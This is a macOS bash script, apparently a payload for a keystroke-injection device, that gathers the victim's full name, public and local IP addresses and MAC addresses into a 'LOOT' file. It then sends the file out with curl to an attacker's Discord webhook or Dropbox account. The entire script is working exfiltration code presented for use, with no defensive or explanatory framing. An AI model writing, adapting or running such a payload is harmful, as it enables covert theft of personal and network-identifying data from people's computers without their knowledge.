#!/bin/bash

# Set up file name with timestamp and username
FileName="$TMPDIR/$USER-LOOT-$(date '+%Y-%m-%d_%H-%M').txt"


#------------------------------------------------------------------------------------------------------------------------------------

# Function to get full name of the local user (macOS-specific command)
get_full_name() {
    fullName=$(dscl . -read /Users/$USER RealName | tail -1)
    if [ -z "$fullName" ]; then
        echo "$USER"
    else
        echo "$fullName"
    fi
}

# Assign full name to a variable
fullName=$(get_full_name)


#------------------------------------------------------------------------------------------------------------------------------------

# Function to get email of the primary owner (macOS doesn't have a direct equivalent, so we return a placeholder)
get_email() {
    # No direct macOS equivalent for computer owner email, so return placeholder
    echo "No Email Detected"
}

# Assign email to a variable
email=$(get_email)

#------------------------------------------------------------------------------------------------------------------------------------

# Get public IP using curl
computerPubIP=$(curl -s ifconfig.me || echo "Error getting Public IP")

# Get local IP addresses (using networksetup for macOS)
localIP=$(ifconfig | grep 'inet ' | awk '{print $2}' | grep -v 127.0.0.1)

# Get MAC addresses (using networksetup for macOS)
MAC=$(ifconfig | awk '/ether/{print $2}')

#------------------------------------------------------------------------------------------------------------------------------------

# Prepare the output content
output=$(cat <<EOF
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
EOF
)

# Write output to file
echo "$output" > "$FileName"


#------------------------------------------------------------------------------------------------------------------------------------

# Function to upload file or message to Discord webhook
upload_discord() {
    echo Uploading discord
    local file="$1"
    local text="$2"
    local hookurl="$dc"

    if [ -n "$text" ]; then
        curl -H "Content-Type: application/json" -X POST -d "{\"username\": \"$USER\", \"content\": \"$text\"}" "$hookurl"
    fi

    if [ -n "$file" ]; then
        curl -F "file=@$file" "$hookurl"
    fi
}

# Check if Discord webhook URL is set and upload file
if [ -n "$dc" ]; then
    upload_discord "$FileName" ""
fi

#------------------------------------------------------------------------------------------------------------------------------------

# Function to upload file to Dropbox using API
dropbox_upload() {
    local sourceFilePath="$1"
    local outputFile=$(basename "$sourceFilePath")
    local targetFilePath="/$outputFile"
    local authorization="Bearer $db"
    
    curl -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: $authorization" \
        --header "Dropbox-API-Arg: {\"path\": \"$targetFilePath\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @"$sourceFilePath"
}

# Check if Dropbox token is set and upload file
if [ -n "$db" ]; then
    dropbox_upload "$FileName"
fi


